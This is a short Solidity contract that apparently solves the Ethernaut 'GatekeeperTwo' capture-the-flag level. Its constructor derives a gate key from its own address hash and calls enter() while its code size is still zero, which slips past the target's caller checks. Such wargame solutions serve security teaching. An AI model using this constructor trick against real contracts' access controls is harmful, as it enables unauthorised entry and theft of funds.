// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoChallenge {
    constructor(address gatekeeper) {
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (type(uint64).max)
        );

        IGatekeeperTwo(gatekeeper).enter(gateKey);
    }
}
